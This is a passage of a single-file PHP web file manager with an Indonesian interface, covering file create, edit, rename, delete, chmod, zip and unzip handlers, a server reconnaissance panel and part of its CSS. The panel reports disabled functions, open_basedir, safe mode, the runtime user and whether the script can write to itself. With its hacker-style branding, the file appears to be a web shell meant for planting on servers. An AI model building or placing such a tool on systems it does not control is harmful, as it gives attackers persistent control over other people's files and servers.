            } else {
                @error_clear_last();
                if (@file_put_contents($new, '') !== false) {
                    $msg = "✔ File '" . basename($new) . "' berhasil dibuat"; $msg_type = 'success';
                } else {
                    $msg = "Gagal membuat file: " . last_err_msg('unknown error'); $msg_type = 'error';}
            }
        }
    }
    elseif ($action === 'save') {
        $name = isset($_POST['file']) ? $_POST['file'] : '';
        $fpath = safe_path($ROOT, $cwd . '/' . $name);
        if (!$fpath || !is_file($fpath)) {
            $msg = "File tidak ditemukan atau di luar jangkauan"; $msg_type = 'error';
        } elseif (is_protected($fpath)) {
            $msg = "File '" . basename($fpath) . "' dilindungi sistem (tidak bisa diedit)"; $msg_type = 'error';
        } elseif (!is_writable($fpath)) {
            $msg = "Permission denied: file '" . basename($fpath) . "' read-only"; $msg_type = 'error';
        } else {
            @error_clear_last();
            $content = isset($_POST['content']) ? $_POST['content'] : '';
            $bytes = @file_put_contents($fpath, $content);
            if ($bytes !== false) {
                $msg = "✔ File '" . basename($fpath) . "' tersimpan (" . format_size($bytes) . ")"; $msg_type = 'success';
            } else {
                $msg = "Gagal menyimpan file: " . last_err_msg('unknown error'); $msg_type = 'error';
            }
        }
    }
    elseif ($action === 'rename') {
        $oldName = isset($_POST['old']) ? $_POST['old'] : '';
        $newName = isset($_POST['new']) ? $_POST['new'] : '';
        $old = safe_path($ROOT, $cwd . '/' . $oldName);
        if (!$old || !file_exists($old)) {
            $msg = "File/folder asal tidak ditemukan"; $msg_type = 'error';
        } elseif (is_protected($old) || is_protected($cwd . '/' . basename($newName))) {
            $msg = "File dilindungi sistem (tidak bisa di-rename)"; $msg_type = 'error';
        } elseif (!valid_name($newName)) {
            $msg = "Nama baru tidak valid"; $msg_type = 'error';
        } else {
            $new = $cwd . '/' . basename($newName);
            if ($old === $new) {
                $msg = "Nama tidak berubah"; $msg_type = 'error';
            } elseif (file_exists($new)) {
                $msg = "Nama '" . basename($newName) . "' sudah dipakai"; $msg_type = 'error';
            } elseif (!is_writable(dirname($old))) {
                $msg = "Permission denied: tidak ada izin rename di folder ini"; $msg_type = 'error';
            } else {
                @error_clear_last();
                if (@rename($old, $new)) {
                    $msg = "✔ Berhasil rename '" . basename($old) . "' → '" . basename($new) . "'"; $msg_type = 'success';
                } else {
                    $msg = "Gagal rename: " . last_err_msg('unknown error'); $msg_type = 'error';
                }
            }
        }
    }
    elseif ($action === 'delete') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        $target = safe_path($ROOT, $cwd . '/' . $name);
        if (!$target || !file_exists($target)) {
            $msg = "Target tidak ditemukan"; $msg_type = 'error';
        } elseif (is_protected($target)) {
            $msg = "File '" . basename($target) . "' dilindungi sistem (tidak bisa dihapus)"; $msg_type = 'error';
        } elseif (!is_writable(dirname($target))) {
            $msg = "Permission denied: tidak ada izin hapus di folder ini"; $msg_type = 'error';
        } else {
            $baseName = basename($target);
            $isDir = is_dir($target);
            @error_clear_last();
            if ($isDir) {
                $rrm = function($dir) use (&$rrm) {
                    foreach (array_diff(scandir($dir), ['.', '..']) as $f) {
                        $p = $dir . '/' . $f;
                        if (is_dir($p)) { if (!$rrm($p)) return false; }
                        else { if (!@unlink($p)) return false; }
                    }
                    return @rmdir($dir);
                };
                $ok = $rrm($target);
            } else {
                $ok = @unlink($target);
            }
            if ($ok) {
                $msg = "✔ Berhasil menghapus " . ($isDir ? "folder" : "file") . " '$baseName'"; $msg_type = 'success';
            } else {
                $msg = "Gagal menghapus '$baseName': " . last_err_msg('mungkin ada file read-only atau sedang dipakai'); $msg_type = 'error';
            }
        }
    }
    elseif ($action === 'chmod') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        $permStr = isset($_POST['perms']) ? trim($_POST['perms']) : '';
        $target = safe_path($ROOT, $cwd . '/' . $name);
        if (!$target || !file_exists($target)) {
            $msg = "Target tidak ditemukan"; $msg_type = 'error';
        } elseif (is_protected($target)) {
            $msg = "File '" . basename($target) . "' dilindungi sistem"; $msg_type = 'error';
        } elseif (!preg_match('/^0?[0-7]{3}$/', $permStr)) {
            $msg = "Format permission tidak valid (harus 3-4 digit oktal, contoh: 755 atau 0755)"; $msg_type = 'error';
        } else {
            $perm = intval($permStr, 8);
            @error_clear_last();
            if (@chmod($target, $perm)) {
                $msg = "✔ Permission '" . basename($target) . "' diubah ke $permStr"; $msg_type = 'success';
            } else {
                $msg = "Gagal mengubah permission: " . last_err_msg('mungkin chmod tidak didukung (Windows) atau permission denied'); $msg_type = 'error';
            }
        }
    }
    elseif ($action === 'bulk_delete' && !empty($_POST['items']) && is_array($_POST['items'])) {
        if (!is_writable($cwd)) {
            $msg = "Permission denied: folder tidak bisa ditulis"; $msg_type = 'error';
        } else {
            $ok = 0; $fail = 0; $errors = [];
            $rrm = function($dir) use (&$rrm) {
                foreach (array_diff(scandir($dir), ['.', '..']) as $f) {
                    $p = $dir . '/' . $f;
                    if (is_dir($p)) { if (!$rrm($p)) return false; }
                    else { if (!@unlink($p)) return false; }
                }
                return @rmdir($dir);
            };
            foreach ($_POST['items'] as $name) {
                $target = safe_path($ROOT, $cwd . '/' . $name);
                if (!$target || !file_exists($target)) { $fail++; $errors[] = basename($name) . ": tidak ada"; continue; }
                if (is_protected($target)) { $fail++; $errors[] = basename($target) . ": dilindungi"; continue; }
                @error_clear_last();
                $res = is_dir($target) ? $rrm($target) : @unlink($target);
                if ($res) $ok++;
                else { $fail++; $errors[] = basename($target) . ": " . last_err_msg('gagal'); }
            }
            if ($fail === 0) { $msg = "✔ Berhasil menghapus $ok item"; $msg_type = 'success'; }
            else { $msg = "Selesai: $ok berhasil, $fail gagal" . ($errors ? " — " . implode(' | ', array_slice($errors, 0, 2)) : ''); $msg_type = ($ok > 0 ? 'error' : 'error'); }
        }
    }
    elseif ($action === 'zip' && !empty($_POST['items']) && is_array($_POST['items'])) {
        if (!class_exists('ZipArchive')) {
            $msg = "Extension ZipArchive tidak tersedia di server ini"; $msg_type = 'error';
        } elseif (!is_writable($cwd)) {
            $msg = "Permission denied: folder tidak bisa ditulis"; $msg_type = 'error';
        } else {
            $zipName = isset($_POST['zipname']) ? trim($_POST['zipname']) : '';
            if ($zipName === '') $zipName = 'archive-' . date('Ymd-His') . '.zip';
            if (!preg_match('/\.zip$/i', $zipName)) $zipName .= '.zip';
            if (!valid_name($zipName)) {
                $msg = "Nama file zip tidak valid"; $msg_type = 'error';
            } else {
                $zipPath = $cwd . '/' . basename($zipName);
                if (file_exists($zipPath)) {
                    $msg = "File '$zipName' sudah ada"; $msg_type = 'error';
                } else {
                    $zip = new ZipArchive();
                    if ($zip->open($zipPath, ZipArchive::CREATE) !== true) {
                        $msg = "Gagal membuat file zip"; $msg_type = 'error';
                    } else {
                        $added = 0;foreach ($_POST['items'] as $name) {
                            $src = safe_path($ROOT, $cwd . '/' . $name);
                            if (!$src || !file_exists($src)) continue;
                            if (is_protected($src)) continue;
                            if (is_file($src)) {
                                $zip->addFile($src, basename($src));
                                $added++;
                            } else if (is_dir($src)) {
                                $baseDir = basename($src);
                                $zip->addEmptyDir($baseDir);
                                $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                                foreach ($rii as $f) {
                                    if (is_protected($f->getPathname())) continue;
                                    $rel = $baseDir . '/' . str_replace('\\', '/', substr($f->getPathname(), strlen($src) + 1));
                                    if ($f->isDir()) $zip->addEmptyDir($rel);
                                    else $zip->addFile($f->getPathname(), $rel);
                                }
                                $added++;
                            }
                        }
                        $zip->close();
                        $msg = "✔ Archive '$zipName' dibuat ($added item, " . format_size(@filesize($zipPath)) . ")"; $msg_type = 'success';
                    }
                }
            }
        }
    }
    elseif ($action === 'unzip' && !empty($_POST['name'])) {
        if (!class_exists('ZipArchive')) {
            $msg = "Extension ZipArchive tidak tersedia"; $msg_type = 'error';
        } else {
            $src = safe_path($ROOT, $cwd . '/' . $_POST['name']);
            if (!$src || !is_file($src)) {
                $msg = "File zip tidak ditemukan"; $msg_type = 'error';
            } elseif (!is_writable($cwd)) {
                $msg = "Permission denied: folder tujuan tidak bisa ditulis"; $msg_type = 'error';
            } else {
                $extractTo = isset($_POST['to']) && trim($_POST['to']) !== ''
                    ? trim($_POST['to'])
                    : pathinfo(basename($src), PATHINFO_FILENAME);
                $extractTo = basename($extractTo);
                if (!valid_name($extractTo)) {
                    $msg = "Nama folder ekstrak tidak valid"; $msg_type = 'error';
                } else {
                    $targetDir = $cwd . '/' . $extractTo;
                    if (!is_dir($targetDir) && !@mkdir($targetDir, 0755, true)) {
                        $msg = "Gagal membuat folder ekstrak: " . last_err_msg(); $msg_type = 'error';
                    } else {
                        $zip = new ZipArchive();
                        $open = $zip->open($src);
                        if ($open !== true) {
                            $msg = "Gagal membuka zip (code $open)"; $msg_type = 'error';
                        } else {
                            $num = $zip->numFiles;
                            $entries = [];
                            $skipped = 0;
                            $targetReal = realpath($targetDir);
                            for ($i = 0; $i < $num; $i++) {
                                $stat = $zip->statIndex($i);
                                if (!$stat) continue;
                                $entryName = $stat['name'];
                                // Block path traversal: reject entries that escape targetDir.
                                $clean = str_replace('\\', '/', $entryName);
                                if (strpos($clean, '../') !== false || strpos($clean, '..\\') !== false || preg_match('#(^|/)\\.\\.($|/)#', $clean)) {
                                    $skipped++; continue;
                                }
                                if (is_protected($targetDir . '/' . basename($clean))) { $skipped++; continue; }
                                $entries[] = $entryName;
                            }
                            $ok = empty($entries) ? true : $zip->extractTo($targetDir, $entries);
                            $zip->close();
                            if ($ok) {
                                $extracted = count($entries);
                                $note = $skipped > 0 ? " ($skipped item dilewati: traversal/protected)" : '';
                                $msg = "✔ Berhasil extract $extracted item ke '$extractTo/'$note"; $msg_type = $skipped > 0 ? 'error' : 'success';
                            } else {
                                $msg = "Gagal extract zip"; $msg_type = 'error';
                            }
                        }
                    }
                }
            }
        }
    }
}

// =================== DATA LIST ===================
$items = [];
if (is_dir($cwd)) {
    foreach (array_diff(scandir($cwd), ['.', '..']) as $f) {
        $p = $cwd . '/' . $f;
        $items[] = [
            'name' => $f,
            'path' => $p,
            'is_dir' => is_dir($p),
            'size' => is_file($p) ? @filesize($p) : 0,
            'mtime' => @filemtime($p),
            'perms' => get_perms($p),
            'perms_oct' => get_perms_oct($p),
            'owner' => get_owner($p),
            'group' => get_group($p),
            'writable' => is_writable($p),
            'readable' => is_readable($p),
            'type' => file_type_class($f, is_dir($p)),
        ];
    }
    usort($items, function($a, $b) {
        if ($a['is_dir'] !== $b['is_dir']) return $b['is_dir'] - $a['is_dir'];
        return strcasecmp($a['name'], $b['name']);
    });
}

// Build full-path breadcrumbs from absolute $cwd
$cwdNorm = str_replace('\\', '/', $cwd);
$rootNorm = str_replace('\\', '/', $ROOT);
$crumbs = [];
$parts = preg_split('#/#', $cwdNorm, -1, PREG_SPLIT_NO_EMPTY);
$acc = '';
$isWin = stripos(PHP_OS, 'WIN') === 0;
foreach ($parts as $i => $part) {
    if ($isWin && $i === 0) {
        // Windows drive letter (e.g. "C:")
        $acc = $part;
        $display = $part;
    } else {
        $acc .= '/' . $part;
        $display = $part;
    }
    $real = $isWin ? $acc . ($i === 0 ? '/' : '') : $acc;
    $isClickable = safe_path($ROOT, $real) !== false;
    $crumbs[] = ['name' => $display, 'path' => $real, 'clickable' => $isClickable];
}

$uname = function_exists('php_uname') ? php_uname() : PHP_OS;
$free = @disk_free_space($cwd);
$total = @disk_total_space($cwd);
$srv_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
$cli_ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
$disk_used_pct = $total > 0 ? round((($total - $free) / $total) * 100, 1) : 0;

$total_files = 0; $total_dirs = 0; $total_size = 0;
foreach ($items as $it) {
    if ($it['is_dir']) $total_dirs++;
    else { $total_files++; $total_size += $it['size']; }
}

// =================== SYSTEM INFO ===================
$sys_script_owner = function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner(__FILE__)) : false;
$sys_current_uid  = function_exists('posix_geteuid') ? posix_geteuid() : (function_exists('posix_getuid') ? posix_getuid() : null);
$sys_current_gid  = function_exists('posix_getegid') ? posix_getegid() : (function_exists('posix_getgid') ? posix_getgid() : null);
$sys_runtime_user = ($sys_current_uid !== null && function_exists('posix_getpwuid')) ? (@posix_getpwuid($sys_current_uid)['name'] ?? (string)$sys_current_uid) : (@get_current_user() ?: '-');
$sys_self_writable = is_writable(__FILE__) ? 'Yes' : 'No';
$sys_home = isset($_SERVER['HOME']) ? $_SERVER['HOME'] : (isset($_SERVER['USERPROFILE']) ? $_SERVER['USERPROFILE'] : '-');
$sys_disable = @ini_get('disable_functions'); if (!$sys_disable) $sys_disable = '(none)';
$sys_open_basedir = @ini_get('open_basedir'); if (!$sys_open_basedir) $sys_open_basedir = '(none)';
$sys_safe_mode = @ini_get('safe_mode'); if ($sys_safe_mode=== false || $sys_safe_mode === '') $sys_safe_mode = 'Off';
$__mysql_fn = 'mysql_get_client_info';
$sys_mysql = function_exists('mysqli_get_client_info') ? mysqli_get_client_info() : (function_exists($__mysql_fn) ? @call_user_func($__mysql_fn) : '-');
$sys_curl = function_exists('curl_version') ? (curl_version()['version'] ?? '-') : '-';
$sys_exts = @get_loaded_extensions(); if (!is_array($sys_exts)) $sys_exts = [];
sort($sys_exts, SORT_FLAG_CASE | SORT_STRING);

$sysinfo = [
    'Server' => [
        'OS'              => PHP_OS . ' (' . (PHP_INT_SIZE * 8) . '-bit)',
        'Kernel'          => $uname,
        'Hostname'        => @gethostname() ?: '-',
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? '-',
        'Server Name'     => $_SERVER['SERVER_NAME'] ?? '-',
        'Server IP'       => $srv_ip,
        'Server Port'     => $_SERVER['SERVER_PORT'] ?? '-',
        'Document Root'   => $_SERVER['DOCUMENT_ROOT'] ?? '-',
        'Server Admin'    => $_SERVER['SERVER_ADMIN'] ?? '-',
        'Protocol'        => $_SERVER['SERVER_PROTOCOL'] ?? '-',
        'HTTPS'           => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'On' : 'Off',
    ],
    'PHP' => [
        'Version'              => PHP_VERSION,
        'SAPI'                 => PHP_SAPI,
        'Zend Version'         => zend_version(),
        'Memory Limit'         => @ini_get('memory_limit') ?: '-',
        'Upload Max Filesize'  => @ini_get('upload_max_filesize') ?: '-',
        'Post Max Size'        => @ini_get('post_max_size') ?: '-',
        'Max Execution Time'   => (@ini_get('max_execution_time') ?: '0') . 's',
        'Max Input Vars'       => @ini_get('max_input_vars') ?: '-',
        'Default Timezone'     => @date_default_timezone_get(),
        'Display Errors'       => @ini_get('display_errors') ? 'On' : 'Off',
        'Allow URL Fopen'      => @ini_get('allow_url_fopen') ? 'On' : 'Off',
        'Allow URL Include'    => @ini_get('allow_url_include') ? 'On' : 'Off',
        'Safe Mode'            => $sys_safe_mode,
        'Magic Quotes GPC'     => (function_exists('get_magic_quotes_gpc') && @call_user_func('get_magic_quotes_gpc')) ? 'On' : 'Off',
        'open_basedir'         => $sys_open_basedir,
        'disable_functions'    => $sys_disable,
        'Loaded Extensions'    => count($sys_exts),
    ],
    'User' => [
        'Runtime User'   => $sys_runtime_user,
        'Script Owner'   => $sys_script_owner ? $sys_script_owner['name'] : (@get_current_user() ?: (function_exists('posix_getpwuid') ? '?' : 'n/a (Windows)')),
        'Self Writable'  => $sys_self_writable,
        'UID / GID'      => ($sys_current_uid === null ? 'n/a' : $sys_current_uid) . ' / ' . ($sys_current_gid === null ? 'n/a' : $sys_current_gid),
        'Home'           => $sys_home,
        'Temp Dir'       => @sys_get_temp_dir() ?: '-',
        'Client IP'      => $cli_ip ?: '-',
        'User Agent'     => $_SERVER['HTTP_USER_AGENT'] ?? '-',
        'Request Time'   => @date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME'] ?? time()),
    ],
    'Disk' => [
        'Path'           => $cwd,
        'Total'          => format_size($total),
        'Free'           => format_size($free),
        'Used'           => format_size($total - $free),
        'Used %'         => $disk_used_pct . '%',
        'Script File'    => __FILE__,
        'Script Size'    => format_size(@filesize(__FILE__)),
        'Script Mtime'   => @date('Y-m-d H:i:s', @filemtime(__FILE__)),
    ],
    'Database' => [
        'MySQL Client'   => $sys_mysql ?: '-',
        'cURL'           => $sys_curl ?: '-',
        'OpenSSL'        => defined('OPENSSL_VERSION_TEXT') ? OPENSSL_VERSION_TEXT : (extension_loaded('openssl') ? 'loaded' : '-'),
        'GD'             => function_exists('gd_info') ? (gd_info()['GD Version'] ?? 'loaded') : '-',
        'Zip'            => class_exists('ZipArchive') ? 'loaded' : '-',
    ],
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>👑 <?= htmlspecialchars($BRAND) ?> · <?= htmlspecialchars(basename($cwd)) ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
*,*::before,*::after { margin:0; padding:0; box-sizing:border-box; }
:root {
    --bg: #140604;
    --bg-2: #1c0907;
    --panel: #22100c;
    --panel-2: #2c1610;
    --border: #3d1e16;
    --border-hi: #5a2a1f;
    --text: #f5e9d6;
    --text-dim: #c9a97a;
    --text-mute: #8a6a48;
    --accent: #e63946;
    --accent-2: #ffd700;
    --accent-3: #ffb627;
    --warn: #ffb627;
    --danger: #ff2d2d;
    --success: #d4af37;
    --gold: #ffd700;
    --gold-soft: #f4c842;
    --gold-deep: #b8860b;
    --red-soft: #ff4757;
    --red-deep: #8b0000;
    --shadow-glow: 0 0 0 1px rgba(255,215,0,.18), 0 8px 32px rgba(230,57,70,.12);
}
html, body { height: 100%; }
body {
    font-family: 'Inter', system-ui, -apple-system, sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    overflow-x: hidden;
    position: relative;
}
body::before {
    content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
    background:
        radial-gradient(60% 50% at 10% 0%, rgba(230,57,70,.22), transparent 60%),
        radial-gradient(50% 40% at 100% 0%, rgba(255,215,0,.15), transparent 60%),
        radial-gradient(50% 50% at 50% 100%, rgba(184,134,11,.12), transparent 60%);
}
body::after {
    content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
    background-image:
        linear-gradient(rgba(255,215,0,.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,215,0,.05) 1px, transparent 1px);
    background-size: 40px 40px;
    mask-image: radial-gradient(ellipse at center, #000 40%, transparent 80%);
}
.app { position:relative; z-index:1; max-width: 1500px; margin: 0 auto; padding: 24px; }

/* =============== HEADER =============== */
.topbar {
    display:flex; align-items:center; justify-content:space-between;
    gap:16px; flex-wrap:wrap; margin-bottom:20px;
}
.brand {
    display:flex; align-items:center; gap:12px;
}
.brand-logo {
    width:46px; height:46px; border-radius:12px;
    background: linear-gradient(135deg, var(--red-deep) 0%, var(--accent) 50%, var(--gold) 100%);
    display:flex; align-items:center; justify-content:center;
    box-shadow: 0 8px 24px rgba(230,57,70,.5), inset 0 1px 0 rgba(255,215,0,.3);
    position:relative;
    border: 1px solid rgba(255,215,0,.35);
}
.brand-logo svg { width:24px; height:24px; color:#fff; filter: drop-shadow(0 1px 2px rgba(0,0,0,.4)); }
.brand-logo::after {
    content:''; position:absolute; inset:-2px; border-radius:14px;
    background: linear-gradient(135deg, var(--accent), var(--gold));
    opacity:.5; filter: blur(14px); z-index:-1;
}
.brand-text h1 {
    font-size: 22px; font-weight: 800; letter-spacing: -0.02em;
    background: linear-gradient(90deg, var(--gold) 0%, var(--gold-soft) 40%, var(--accent) 100%);
    -webkit-background-clip: text; background-clip: text;
    -webkit-text-fill-color: transparent; color: transparent;
    text-shadow: 0 0 30px rgba(255,215,0,.15);
}
.brand-text .brand-svg {
    display:block; height:28px; width:auto;
    filter: drop-shadow(0 0 12px rgba(255,215,0,.18));
    pointer-events:none; user-select:none;
}
.brand-text p { font-size:10px; color:var(--gold-deep); letter-spacing:.18em; text-transform:uppercase; font-weight:600; margin-top:2px; display:flex; align-items:center; gap:8px; }
.brand-tampered { color:#ff6b6b; background:rgba(255,45,45,.12); border:1px solid rgba(255,45,45,.4); padding:1px 6px; border-radius:4px; font-size:9px; letter-spacing:.08em; }
.topbar-info {
    display:flex; gap:8px; align-items:center; font-size:12px; color:var(--text-dim);
}
.pill{
    background: rgba(255,255,255,.03);
    border: 1px solid var(--border);
    padding: 6px 12px; border-radius: 999px;
    display:inline-flex; align-items:center; gap:6px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
}
.pill .dot { width:6px; height:6px; border-radius:50%; background:var(--success); box-shadow:0 0 8px var(--success); }
.pill-logout {
    text-decoration:none; color:var(--gold-soft); cursor:pointer;
    border-color:rgba(255,215,0,.25); transition:all .15s;
}
.pill-logout:hover { color:var(--danger); border-color:rgba(255,45,45,.4); background:rgba(255,45,45,.08); }

/* =============== STAT CARDS =============== */
.stats {
    display:grid; grid-template-columns: repeat(4, 1fr); gap:14px; margin-bottom:20px;
}
.stat {
    background: linear-gradient(135deg, var(--panel) 0%, var(--panel-2) 100%);
    border: 1px solid var(--border);
    border-radius: 14px; padding: 16px 18px;
    position:relative; overflow:hidden;
    transition: all .25s ease;
}
.stat::before {
    content:''; position:absolute; top:0; left:0; right:0; height:2px;
    background: linear-gradient(90deg, var(--accent), var(--gold));
    opacity:.7;
}
.stat:hover { transform: translateY(-2px); border-color: var(--border-hi); }
.stat-clickable { cursor:pointer; user-select:none; }
.stat-clickable:hover {
    border-color: rgba(255,215,0,.5);
    box-shadow: 0 8px 24px rgba(230,57,70,.12), 0 0 0 1px rgba(255,215,0,.15);
}
.stat-clickable:hover .stat-icon { background:rgba(255,215,0,.2); color:var(--gold); }
.stat-clickable:active { transform: translateY(0); }
.stat-clickable:focus-visible { outline:2px solid var(--gold); outline-offset:2px; }
.stat-sub {
    font-size:10.5px; color:var(--text-mute); margin-top:4px;
    font-family:'JetBrains Mono',monospace; letter-spacing:.02em;
    white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
}
.stat-label { font-size:11px; color:var(--text-mute); text-transform:uppercase; letter-spacing:.08em; margin-bottom:6px; }
.stat-value { font-size:22px; font-weight:700; letter-spacing:-0.02em; }
.stat-value small { font-size:12px; color:var(--text-dim); font-weight:500; margin-left:4px; }
.stat-icon {
    position:absolute; right:14px; top:50%; transform:translateY(-50%);
    width:38px; height:38px; border-radius:10px;
    background: rgba(230,57,70,.14); color: var(--accent);
    display:flex; align-items:center; justify-content:center;
    border: 1px solid rgba(230,57,70,.25);
}
.stat-icon svg { width:18px; height:18px; }
.stat:nth-child(2) .stat-icon { background: rgba(255,215,0,.12); color: var(--gold); border-color: rgba(255,215,0,.3); }
.stat:nth-child(3) .stat-icon { background: rgba(184,134,11,.14); color: var(--gold-soft); border-color: rgba(255,215,0,.25); }
.stat:nth-child(4) .stat-icon { background: rgba(255,182,39,.14); color: var(--gold-soft); border-color: rgba(255,182,39,.3); }
.disk-bar { margin-top:8px; height:4px; background: rgba(255,255,255,.05); border-radius:2px; overflow:hidden; }
.disk-fill { height:100%; background: linear-gradient(90deg, var(--accent), var(--gold)); border-radius:2px; transition: width .6s; }

/* =============== BREADCRUMB =============== */
.breadcrumb {
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 10px 14px;
    border-radius: 12px;
    margin-bottom: 16px;
    display:flex; align-items:center; gap:6px; flex-wrap:wrap;
    font-size: 13px;
    font-family: 'JetBrains Mono', monospace;
}
.breadcrumb { display: flex; align-items: center; gap: 6px; }
.breadcrumb .crumb-wrap { display:flex; align-items:center; gap:4px; flex-wrap: wrap; flex: 1; min-width: 0; }
.breadcrumb .home-ic { color: var(--gold); width:14px; height:14px; }
.breadcrumb .crumb-home { padding: 4px 8px; border-radius: 6px; display:inline-flex; align-items:center; transition: all .15s; }
.breadcrumb .crumb-home:hover { background: rgba(255,215,0,.1); }
.breadcrumb a {
    color: var(--text-dim); text-decoration:none;
    padding: 3px 8px; border-radius: 6px; transition: all .15s;
    white-space: nowrap;
}
.breadcrumb a:hover { background: rgba(230,57,70,.15); color: var(--gold-soft); }
.breadcrumb .crumb-wrap > a:last-of-type { color: var(--gold); background: rgba(255,215,0,.08); border: 1px solid rgba(255,215,0,.2); }
.breadcrumb .crumb-static { color: var(--text-mute); padding: 3px 8px; font-style: italic; }
.breadcrumb .sep { color: var(--accent); opacity:.7; }
.breadcrumb .crumb-edit, .breadcrumb .crumb-go, .breadcrumb .crumb-cancel {
    background: transparent; border: 1px solid var(--border);
    color: var(--gold-soft); cursor: pointer;
    padding: 6px 8px; border-radius: 7px;
    display:inline-flex; align-items:center; justify-content:center;
    transition: all .15s; flex-shrink: 0;
}
.breadcrumb .crumb-edit svg, .breadcrumb .crumb-go svg, .breadcrumb .crumb-cancel svg { width:14px; height:14px; }
.breadcrumb .crumb-edit:hover { border-color: var(--gold); color: var(--gold); background: rgba(255,215,0,.08); }
.breadcrumb .crumb-go { background: linear-gradient(135deg, var(--accent), var(--gold)); color: #1a0605; border-color: rgba(255,215,0,.4); }
.breadcrumb .crumb-go:hover { box-shadow: 0 2px 8px rgba(255,215,0,.3); }
.breadcrumb .crumb-cancel:hover { border-color: var(--red-soft); color: var(--red-soft); background: rgba(255,45,45,.1); }
.breadcrumb .crumb-input {
    flex: 1; width: 100%; min-width: 0;
    background: var(--bg-2); border: 1px solid var(--gold);
    color: var(--gold-soft); padding: 7px 12px; border-radius: 7px;
    font-family: 'JetBrains Mono', monospace; font-size: 13px;
    box-shadow: 0 0 0 3px rgba(255,215,0,.1);
}
.breadcrumb .crumb-input:focus { outline: none; border-color: var(--gold); box-shadow: 0 0 0 3px rgba(255,215,0,.2); }
.breadcrumb.editing .crumb-wrap, .breadcrumb.editing .crumb-edit { display: none !important; }
.breadcrumb.editing #crumb-form { display: flex !important; }

/* =============== TOOLBAR =============== */
.toolbar {
    display:flex; gap:10px; flex-wrap:wrap; margin-bottom: 16px;
    align-items: center;
}
.search-box {
    flex:1; min-width:200px; position:relative;
}
.search-box svg {
    position:absolute; left:14px; top:50%; transform:translateY(-50%);
    width:16px; height:16px; color: var(--text-mute); pointer-events:none;
}
.search-box input {
    width:100%; background: var(--panel); border: 1px solid var(--border);
    color: var(--text); padding: 11px 14px 11px 40px; border-radius: 10px;
    font-size: 13px; font-family: inherit;
    transition: all .2s;
}
.search-box input:focus { outline:none; border-color: var(--gold); box-shadow: 0 0 0 3px rgba(255,215,0,.15); }

/* =============== BUTTONS (the main redesign) =============== */
.btn {
    --btn-bg: var(--panel);
    --btn-bg-hover: var(--panel-2);
    --btn-border: var(--border);
    --btn-color: var(--text);
    position: relative;
    display: inline-flex; align-items: center; gap: 8px;
    padding: 10px 16px;
    background: var(--btn-bg);
    color: var(--btn-color);
    border: 1px solid var(--btn-border);
    border-radius: 10px;
    font-size: 13px; font-weight: 500;
    font-family: inherit;
    cursor: pointer;
    text-decoration: none;
    transition: all .2s cubic-bezier(.4,0,.2,1);
    white-space: nowrap;
    letter-spacing: -0.01em;
}
.btn svg { width: 16px; height: 16px; flex-shrink: 0; }
.btn:hover {
    background: var(--btn-bg-hover);
    border-color: var(--border-hi);
    transform: translateY(-1px);
    box-shadow: 0 6px 18px rgba(0,0,0,.3);
}
.btn:active { transform: translateY(0); }

.btn-primary {
    --btn-bg: linear-gradient(135deg, var(--red-deep) 0%, var(--accent) 50%, var(--gold-deep) 100%);
    --btn-bg-hover: linear-gradient(135deg, var(--accent) 0%, var(--gold-soft) 50%, var(--gold) 100%);
    --btn-border: rgba(255,215,0,.4);
    --btn-color: #fff;
    font-weight: 600;
    box-shadow: 0 4px 14px rgba(230,57,70,.4), inset 0 1px 0 rgba(255,215,0,.25);
    text-shadow: 0 1px 2px rgba(0,0,0,.3);
}
.btn-primary:hover{ box-shadow: 0 8px 24px rgba(255,215,0,.4), inset 0 1px 0 rgba(255,255,255,.2); color:#1a0605; }

.btn-success {
    --btn-bg: linear-gradient(135deg, var(--gold-deep) 0%, var(--gold) 100%);
    --btn-color: #1a0605; --btn-border: rgba(255,215,0,.5);
    font-weight: 600;
    box-shadow: 0 4px 14px rgba(255,215,0,.3);
}
.btn-danger {
    --btn-bg: var(--panel);
    --btn-border: var(--border);
    --btn-color: var(--text);
}
.btn-danger:hover {
    --btn-bg: rgba(255,85,119,.12);
    --btn-color: var(--danger);
    border-color: var(--danger);
}
.btn-info {
    --btn-bg: linear-gradient(135deg, rgba(255,215,0,.08), rgba(230,57,70,.08));
    --btn-border: rgba(255,215,0,.3);
    --btn-color: var(--gold-soft);
}
.btn-info:hover {
    --btn-bg: linear-gradient(135deg, rgba(255,215,0,.18), rgba(230,57,70,.16));
    --btn-color: var(--gold);
    border-color: rgba(255,215,0,.5);
}
.btn-icon {
    padding: 10px; aspect-ratio: 1; justify-content:center;
}
.btn-sm { padding: 7px 12px; font-size: 12px; }
.btn-sm svg { width: 14px; height: 14px; }

.view-toggle {
    display:flex; background: var(--panel); border: 1px solid var(--border);
    border-radius: 10px; padding: 3px;
}
.view-toggle button {
    background: transparent; border: 0; padding: 7px 10px;
    border-radius: 7px; color: var(--text-mute); cursor: pointer;
    display:flex; align-items:center; gap:5px; font-size:12px;
    font-family:inherit; transition: all .15s;
}
.view-toggle button.active {
    background: linear-gradient(135deg, var(--accent), var(--gold));
    color: #1a0605; box-shadow: 0 2px 8px rgba(255,215,0,.35);
    font-weight: 600;
}
